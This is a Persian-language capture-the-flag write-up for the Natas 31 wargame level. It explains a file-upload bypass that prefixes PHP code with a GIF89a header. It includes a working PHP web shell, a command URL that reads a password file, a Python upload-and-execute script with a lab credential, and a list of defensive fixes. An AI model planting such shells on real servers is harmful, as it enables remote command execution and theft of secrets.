۳۱ آپلود فایل — دور زدن اعتبارسنجی تصویر پیشرفته
// مفاهیم کلیدی
آپلود فایل اعتبارسنجی تصویر بایت‌های جادویی تزریق GIF اجرای کد PHP
// مرور کلی چالش

این سطح یک ویژگی آپلود فایل دارد که سعی می‌کند فایل آپلود شده را به عنوان یک تصویر معتبر تأیید کند. با این حال، اعتبارسنجی با استفاده از getimagesize() و exif_imagetype() انجام می‌شود که فقط هدر فایل را بررسی می‌کنند. با ایجاد یک فایل که با داده‌های تصویر معتبر شروع می‌شود اما همچنین حاوی کد PHP است، می‌توانیم آن را دور بزنیم.

// تحلیل اولیه

کد منبع را بررسی کنید:

<?php if (array_key_exists("upload", $_FILES)) { $filename = $_FILES["upload"]["name"]; $tmp_name = $_FILES["upload"]["tmp_name"]; if (getimagesize($tmp_name) !== false && exif_imagetype($tmp_name) !== false) { move_uploaded_file($tmp_name, "upload/" . $filename); echo "File uploaded successfully!"; } else { echo "Invalid image file!"; } } ?>

برنامه از getimagesize() و exif_imagetype() برای تأیید فایل استفاده می‌کند. این توابع فقط هدر فایل را بررسی می‌کنند.

💡 getimagesize() و exif_imagetype() بایت‌های جادویی فایل را بررسی می‌کنند. با اضافه کردن هدرهای تصویر به فایل مخرب خود، می‌توانیم این بررسی‌ها را دور بزنیم.
// مراحل حل

مرحله ۱ — ایجاد فایل PHP با هدر تصویر:

GIF89a; <?php passthru($_GET['cmd']); ?>

مرحله ۲ — آپلود فایل:

سرور فایل را می‌پذیرد زیرا اعتبارسنجی تصویر را پاس می‌کند.

مرحله ۳ — دسترسی به فایل PHP آپلود شده:

http://natas31.natas.labs.overthewire.org/upload/shell.php?cmd=cat /etc/natas_webpass/natas32

با استفاده از Python:

import requests url = "http://natas31.natas.labs.overthewire.org/" auth = ("natas31", "kAv4NINJbG4JFEqPB7PmNPTOeSMOkFjS") payload = """GIF89a; <?php passthru($_GET['cmd']); ?>""" files = {'upload': ('shell.php', payload, 'image/gif')} response = requests.post(url, auth=auth, files=files) url2 = "http://natas31.natas.labs.overthewire.org/upload/shell.php" params = {"cmd": "cat /etc/natas_webpass/natas32"} response2 = requests.get(url2, auth=auth, params=params) print(response2.text)
// چرا کار می‌کند

دور زدن اعتبارسنجی تصویر به دلیل موارد زیر کار می‌کند:

  • بررسی فقط هدر: getimagesize() فقط هدر فایل را بررسی می‌کند.
  • هدر GIF: GIF89a به عنوان یک تصویر GIF معتبر شناخته می‌شود.
  • کد PHP باقی می‌ماند: کد PHP بعد از هدر GIF بررسی نمی‌شود.
  • بدون اعتبارسنجی محتوا: سرور کل فایل را تأیید نمی‌کند.
// اقدامات دفاعی
  • تصاویر آپلود شده را دوباره رمزگذاری کنید با استفاده از GD یا ImageMagick.
  • کل فایل را اعتبارسنجی کنید — فقط هدر را بررسی نکنید.
  • اجرای PHP را در دایرکتوری آپلود غیرفعال کنید.
  • فایل‌های آپلود شده را خارج از ریشه وب ذخیره کنید.
